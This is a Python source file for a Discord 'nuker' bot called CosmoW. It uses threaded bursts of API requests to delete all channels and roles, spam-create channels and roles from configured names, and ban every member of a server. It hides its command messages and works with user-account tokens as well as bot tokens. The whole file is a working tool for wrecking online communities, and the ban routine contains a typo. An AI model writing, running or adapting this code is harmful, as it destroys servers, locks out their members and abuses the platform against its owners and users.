import discord
from discord.ext import commands
import requests
import json
import threading
import sys
import os
import random
import platform
import time
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

__author__ = 'Nell'
__title__ = 'CosmoW'

os.system("title cosmo & mode 85,20")

def menu():
    clear()
    print(Colorate.Vertical(Colors.blue_to_purple, banner, 2))

if sys.platform == "win32":
    clear = lambda: os.system("cls")
else:
    clear = lambda: os.system("clear")

with open("config.json") as f:
    settings = json.load(f)
token = settings.get("Token")
prefix = settings.get("Prefix")
channel_names = settings.get("channel names")
role_names = settings.get("role names")
bot = settings.get("Bot")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }

skar = commands.Bot(
    command_prefix=prefix, 
    intents = discord.Intents.all()
)

@skar.event
async def on_ready():
    clear()
    print(Colorate.Vertical(Colors.blue_to_purple, banner, 2))

@skar.command()
async def dc(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        print("Connection Error")

    def delete_channel(i):
        requests.delete(
            f"https://discord.com/api/v9/channels/{i}",
            headers=headers
        )
        
    try:
        for i in range(3):
            for channel in list(ctx.guild.channels):
                threading.Thread(
                    target=delete_channel,
                    args=(channel.id, )
                ).start()
                print(f"[Delete-Channel] deleted channel; {channel}")
                time.sleep(0.002)
        clear()
        menu()
                
    except Exception:
        pass

@skar.command()
async def cc(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        print("Error")

    def create_channels(i):
        json = {
          "name": i
        }
        requests.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
        
    try:
        for i in range(50):
            threading.Thread(
                target=create_channels,
                args=(random.choice(channel_names), )
            ).start()
            print(f"[Create-Channel] created channel; {random.choice(channel_names)}")
            time.sleep(0.002)
        clear()
        menu()
                
    except Exception:
        pass

@skar.command()
async def dr(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        print("Error")

    def delete_role(i):
        requests.delete(
            f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
            headers=headers
        )
    
    try:
        for i in range(3):
            for role in list(ctx.guild.roles):
                threading.Thread(
                    target=delete_role,
                    args=(role.id, )
                ).start()
                print(f"[Delete-Role] deleted role; {role}")
                time.sleep(0.002)
            clear()
            menu()

    except Exception:
        pass

@skar.command()
async def cr(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        print("Error")

    def create_roles(i):
        json = {
          "name": i
        }
        requests.post(
            f"https://discord.com/api/v9/guilds/{guild}/roles",
            headers=headers,
            json=json
        )

    try:
        for i in range(50):
            threading.Thread(
                target=create_roles,
                args=(random.choice(role_names), )
            ).start()
            print(f"[Create-Role] created role; {random.choice(role_names)}")
            time.sleep(0.002)
        clear()
        menu()
    
    except Exception:
        pass

@skar.command()
async def ba(ctx):
    try:
       await ctx.message.delete()
       guild = ctx.guild.id
    except:
        print(f"Error")
    
    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
          f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
          headers=headers
        )

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(
                    target=mass_ban,
                    args=(member.id, )
                ).start()
                print(f"[Ban-All] banned member; {member}")
                ttime.sleep(0.002)
            clear()
            menu()

    except Exception:
        pass

banner = Center.XCenter(f"""
     >> Author : {__author__} >> Title : {__title__}

                     .::.
                  .:'  .:
        ,MMM8&&&.:'   .:'
       MMMMM88&&&&  .:'     cc - create channels
      MMMMM88&&&&&&:'      dc - delete channels
      MMMMM88&&&&&&       cr - create roles
    .:MMMMM88&&&&&       dr - delete roles
  .:'  MMMMM88&&&&      ba - ban all
.:'   .:'MMM8&&&'
:'  .:'
'::'   
""")

skar.run(token)